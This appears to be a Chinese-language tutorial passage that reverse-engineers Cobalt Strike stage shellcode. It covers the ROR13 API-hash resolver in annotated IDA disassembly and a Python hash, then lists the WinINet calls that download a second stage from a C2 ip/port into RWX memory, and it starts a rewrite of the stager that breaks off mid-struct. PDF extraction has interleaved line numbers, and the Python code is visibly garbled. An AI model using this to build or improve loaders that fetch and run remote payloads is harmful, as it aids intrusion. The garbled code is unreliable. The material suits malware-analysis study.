CS的shellcode功能分析和代码重写实战
前⾔
随着圈⼦⾥的新⼈越来越多，我准备从这⼀篇开始慢慢写⼀些与基础知识相关的⽂章，⽅便
⼀些对⼆进制安全知识了解不多的同学参考。虽然讲的还是基础知识，但是我也尽量写的实
⽤和有趣⼀点，防⽌与⽹上的⽂章出现同质化问题。
这篇要讲的问题是由上⼀篇⽂章 滥⽤具备RWX-S权限且有签名的dll进⾏⽆感知的shellcode
注⼊引出的，有同学问我为什么接收 metepreter  第⼆阶段的恶意代码需要那样写，本篇⽂
章就回答这个问题。
另外⾮常欢迎各位同学在圈⼦⾥提问，能为基础知识板块的编写提供更多素材
CS的shellcode功能分析
我们这⾥讲的其实是stage类型的shellcode，为了⽅便调试从cs中获取出这⼀段代码，我们
需要把它编译成exe，由于我是 *nix 系统，这⾥就⽤ nasm 进⾏编译，⽤ x86_64-w64-min
gw32-ld  进⾏链接⽣成exe。
编写 start.asm 如下：
然后编译连接：
测试⼀下可以上线，接下来⽤ida打开分析⼀下执⾏逻辑
开头就是⼀个 call ，跟进去简单看⼀下代码逻辑：
nasm -f win64 start.asm  -o prog1.o
x86_64-w64-mingw32-ld prog1.o -o prog1.exe
1
2
看到pop了 rbp ，然后 call rbp ，显然这个函数的作⽤是把 call 的下⼀条指令作为函数
进⾏调⽤，我们定义⼀下这个函数，然后仔细阅读⼀下，我对所有的代码都打了注释，这个
函数包含了核⼼代码。
.text:000000014000100A call_function_with_hash proc 
near
.text:000000014000100A
.text:000000014000100A var_38          = qword ptr -38h
.text:000000014000100A
.text:000000014000100A                 push    r9
.text:000000014000100C                 push    r8
.text:000000014000100E                 push    rdx
.text:000000014000100F                 push    rcx
.text:0000000140001010                 push    rsi
.text:0000000140001011                 xor     rdx, rdx
.text:0000000140001014                 mov     rdx, gs:
[rdx+60h] ; 获取 PEB
.text:0000000140001019                 mov     rdx, 
[rdx+18h]  ; 获取 Ldr
.text:000000014000101D                 mov     rdx, 
[rdx+20h]  ; 获取  InMemoryOrderModuleList
.text:0000000140001021
.text:0000000140001021 loc_140001021:                   
       ; CODE XREF: call_function_with_hash+C3↓j
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
.text:0000000140001021                 mov     rsi, 
[rdx+50h]  ; 获取第⼀个dll的BaseDllName
.text:0000000140001025                 movzx   rcx, 
word ptr [rdx+4Ah] ; 获取 BaseDllName unicode_string 的 
max_length
.text:000000014000102A                 xor     r9, r9
.text:000000014000102D
.text:000000014000102D loc_14000102D:                   
       ; CODE XREF: call_function_with_hash+34↓j
.text:000000014000102D                 xor     rax, rax
.text:0000000140001030                 lodsb
.text:0000000140001031                 cmp     al, 61h 
; 'a'
.text:0000000140001033                 jl      short 
loc_140001037
.text:0000000140001035                 sub     al, 20h 
; ' '
.text:0000000140001037
.text:0000000140001037 loc_140001037:                   
       ; CODE XREF: call_function_with_hash+29↑j
.text:0000000140001037                 ror     r9d, 0Dh
.text:000000014000103B                 add     r9d, eax
.text:000000014000103E                 loop    
loc_14000102D   ; 计算 hash
.text:0000000140001040                 push    rdx
.text:0000000140001041                 push    r9
.text:0000000140001043                 mov     rdx, 
[rdx+20h]  ; 获取Dllbase
.text:0000000140001047                 mov     eax, 
[rdx+3Ch]  ; 获取 Pe 的 nt_header
.text:000000014000104A                 add     rax, rdx
.text:000000014000104D                 cmp     word ptr 
[rax+18h], 20Bh ; ⽐较是不是 pe64
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
.text:0000000140001053                 jnz     short 
loc_1400010C7
.text:0000000140001055                 mov     eax, 
[rax+88h]  ; 获取导出表
.text:000000014000105B                 test    rax, rax
.text:000000014000105E                 jz      short 
loc_1400010C7
.text:0000000140001060                 add     rax, rdx 
       ; 获取导出表的地址
.text:0000000140001063                 push    rax
.text:0000000140001064                 mov     ecx, 
[rax+18h]  ; NumberOfNames
.text:0000000140001067                 mov     r8d, 
[rax+20h]  ; AddressOfNames
.text:000000014000106B                 add     r8, rdx
.text:000000014000106E
.text:000000014000106E loc_14000106E:                   
       ; CODE XREF: call_function_with_hash+8A↓j
.text:000000014000106E                 jrcxz   
loc_1400010C6
.text:0000000140001070                 dec     rcx
.text:0000000140001073                 mov     esi, 
[r8+rcx*4] ; 存储函数名称地址
.text:0000000140001077                 add     rsi, rdx
.text:000000014000107A                 xor     r9, r9
.text:000000014000107D
.text:000000014000107D loc_14000107D:                   
       ; CODE XREF: call_function_with_hash+80↓j
.text:000000014000107D                 xor     rax, rax
.text:0000000140001080                 lodsb
.text:0000000140001081                 ror     r9d, 0Dh
.text:0000000140001085                 add     r9d, eax
.text:0000000140001088                 cmp     al, ah
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
.text:000000014000108A                 jnz     short 
loc_14000107D
.text:000000014000108C                 add     r9, 
[rsp+40h+var_38]
.text:0000000140001091                 cmp     r9d, 
r10d
.text:0000000140001094                 jnz     short 
loc_14000106E ; 遍历导出表
.text:0000000140001096                 pop     rax
.text:0000000140001097                 mov     r8d, 
[rax+24h]
.text:000000014000109B                 add     r8, rdx
.text:000000014000109E                 mov     cx, 
[r8+rcx*2]
.text:00000001400010A3                 mov     r8d, 
[rax+1Ch]
.text:00000001400010A7                 add     r8, rdx
.text:00000001400010AA                 mov     eax, 
[r8+rcx*4]
.text:00000001400010AE                 add     rax, rdx 
       ; 存储获取的函数地址
.text:00000001400010B1                 pop     r8
.text:00000001400010B3                 pop     r8
.text:00000001400010B5                 pop     rsi
.text:00000001400010B6                 pop     rcx
.text:00000001400010B7                 pop     rdx
.text:00000001400010B8                 pop     r8
.text:00000001400010BA                 pop     r9
.text:00000001400010BC                 pop     r10
.text:00000001400010BE                 sub     rsp, 20h
.text:00000001400010C2                 push    r10
.text:00000001400010C4                 jmp     rax
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
主要功能就是遍历当前的模块的导出表，根据提供的函数hash找到对应函数，然后jmp过
去。Hash函数的python实现⼤概如下：
.text:00000001400010C6 ; ------------------------------
---------------------------------------------
.text:00000001400010C6
.text:00000001400010C6 loc_1400010C6:                   
       ; CODE XREF: 
call_function_with_hash:loc_14000106E↑j
.text:00000001400010C6                 pop     rax
.text:00000001400010C7
.text:00000001400010C7 loc_1400010C7:                   
       ; CODE XREF: call_function_with_hash+49↑j
.text:00000001400010C7                                 
        ; call_function_with_hash+54↑j
.text:00000001400010C7                 pop     r9
.text:00000001400010C9                 pop     rdx
.text:00000001400010CA                 mov     rdx, 
[rdx]
.text:00000001400010CD                 jmp     
loc_140001021   ; 获取第⼀个dll的BaseDllName
.text:00000001400010CD call_function_with_hash endp
83
84
85
86
87
88
89
90
91
92
93
94
def ror(number,bits):
    return ( (number >> bits) | (number = ord('a') else i
        else:
1
2
3
4
5
6
7
8
9
10
我们不再这⾥浪费太多篇幅，直接在这个函数的 jmp rax  上下断点,使⽤x64dbg进⾏调试，
把调⽤过的函数都记录下来，结果如下：
            c = i
        sum = ror( sum,0xd)
        sum += c
    return sum
def Hash(dllname,funcname):
    dllname += '\x00'
    dllname = dllname.encode('utf-16le')
    funcname += '\x00'
    funcname = funcname.encode('utf-8')
    return (calc_sum(dllname,True)+calc_sum(funcname) ) 
& 0xFFFFFFFF
c = Hash('kernel32.dll','LoadLibraryA')
print(hex(c))
11
12
13
14
15
16
17
18
19
20
21
22
23
24
之后就是jmp到 VirtualAlloc 的出来的这段地址上运⾏了。
可以看到这段代码的运⾏效率其实是⽐较低的，每调⽤⼀次函数就会遍历⼀遍当前所有模块
的所有导出函数，但是为了减少shellcode的体积，这么做也是值的的。
下⾯就开始进⼊了本⽂的重点内容，对上⾯这⼀段代码进⾏重写。如果我们还是按照上⾯的
思路编写shellcode，那其实毫⽆意义，因为随便找个shellcode框架就可以⽣成了，我们接
下来换⼀种实现思路。
代码实现
⾸先我们知道，在⼀个windows系统开机之后，所有进程加载的 ntdll.dll ， kernel32.dl
l , user32.dll 的基址是相同的，这是由于windows内部的某些特定机制决定的，这⾥就不
再展开细讲了。基于这个原理，⼀些函数的固定的函数地址完全可以在当前进程中获取，然
后作为参数传给shellcode执⾏，废话不多说，直接看代码。
⾸先定义要传⼊shellcode函数的数据结构，并对这个结构进⾏赋值：
kernel32.LoadLibraryA("wininet")
rax = wininet.InternetOpenA(NULL,NULL,NULL,NULL,NULL)
wininet.InternetConnectA(rax,ip,port,NULL,NULL,0x3,0,0)
wininet.HttpOpenRequestA(rax,NULL,"/4v9z",NULL,NULL,NULL
,0x84400200,NULL)
wininet.HttpSendRequestA(rax,"User-Agent: Mozilla/4.0 
(compatible; MSIE 7.0; Windows NT 5.1; 
Trident/4.0)\r\n",-1,NULL,0);
kernel32.VirtualAlloc(0,0x400000,0x1000,0x40 )
wininet.InternetReadFile(rcx,rdx,0x2000,rsp)
1
2
3
4
5
6
7
typedef struct _SHELLDATA
{
  pVirtualAlloc fnVirtualAlloc;
1
2
3
  pLoadLibraryA fnLoadLibraryA;
  pGetProcAddress fnGetProcAddress;
  char wininet[15];